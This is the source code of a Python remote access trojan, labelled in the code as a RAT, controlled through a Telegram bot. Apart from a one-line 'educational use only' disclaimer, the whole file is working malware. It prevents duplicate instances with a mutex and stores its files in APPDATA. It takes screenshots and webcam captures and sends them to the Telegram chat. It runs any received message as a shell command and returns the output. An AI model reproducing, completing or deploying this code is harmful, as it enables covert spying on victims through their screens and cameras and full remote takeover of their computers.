# WARNING: This code is for educational use only.
# Do not use it without proper authorization.

import os
import sys
import subprocess
import time
import requests
import ctypes
import logging
import pyautogui
import cv2
import numpy as np


log_path = os.path.join(os.getenv('APPDATA'), 'systemlog.txt')
logging.basicConfig(filename=log_path,
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')


TOKEN = ""
CHAT_ID = ""
URL = f"https://api.telegram.org/bot{TOKEN}"


def check_single_instance():
    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\MyUniqueRATMutexName")
    if ctypes.windll.kernel32.GetLastError() == 183:
        sys.exit(0)


def get_updates(offset=None):
    try:
        params = {'timeout': 100, 'offset': offset}
        response = requests.get(URL + "/getUpdates", params=params)
        return response.json()
    except:
        return {}

def send_message(text):
    try:
        requests.get(URL + "/sendMessage", params={'chat_id': CHAT_ID, 'text': text})
    except:
        pass

def send_file(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(f"{URL}/sendDocument", files={'document': f}, data={'chat_id': CHAT_ID})
    except:
        pass


def capture_screenshot():
    try:
        path = os.path.join(os.getenv('APPDATA'), 'screenshot.png')
        screenshot = pyautogui.screenshot()
        screenshot.save(path)
        return path
    except:
        return None

def list_cameras():
    available = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.read()[0]:
            available.append(i)
        cap.release()
    return available

def capture_webcam(camera_index=0):
    try:
        path = os.path.join(os.getenv('APPDATA'), f'webcam_capture_{camera_index}.jpg')
        cam = cv2.VideoCapture(camera_index)
        result, image = cam.read()
        cam.release()
        if result:
            cv2.imwrite(path, image)
            return path
        return None
    except:
        return None

def execute_command(command):
    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode()


def load_last_update_id():
    path = os.path.join(os.getenv('APPDATA'), 'update_id.txt')
    if os.path.exists(path):
        with open(path, 'r') as f:
            return int(f.read().strip())
    return None

def save_last_update_id(update_id):
    path = os.path.join(os.getenv('APPDATA'), 'update_id.txt')
    with open(path, 'w') as f:
        f.write(str(update_id))

# Main Loop
def main():
    try:
        check_single_instance()
        send_message("💻 RAT Started!")

        last_update_id = load_last_update_id()

        while True:
            updates = get_updates(last_update_id)
            if updates.get("result"):
                for item in updates["result"]:
                    update_id = item["update_id"]
                    message = item.get("message", {})
                    if str(message.get("chat", {}).get("id")) != CHAT_ID:
                        continue

                    command = message.get("text", "")
                    if command:
                        if command.lower() == "/screenshot":
                            path = capture_screenshot()
                            if path:
                                send_file(path)
                                send_message("📸 Screenshot sent.")
                        elif command.lower() == "/listcams":
                            cams = list_cameras()
                            send_message(f"📷 Available Cameras: {cams}")
                        elif command.lower().startswith("/webcam"):
                            try:
                                cam_num = int(command.split(" ")[1])
                                path = capture_webcam(cam_num)
                                if path:
                                    send_file(path)
                                    send_message(f"📸 Webcam {cam_num} captured and sent!")
                            except:
                                send_message("⚠️ Usage: /webcam 0")
                        else:
                            result = execute_command(command)
                            send_message(f"📄 Output:\n{result}")

                    last_update_id = update_id + 1
                    save_last_update_id(last_update_id)

            time.sleep(3)

    except Exception as e:
        logging.error(f"Critical Error: {e}")

if __name__ == "__main__":
    main()
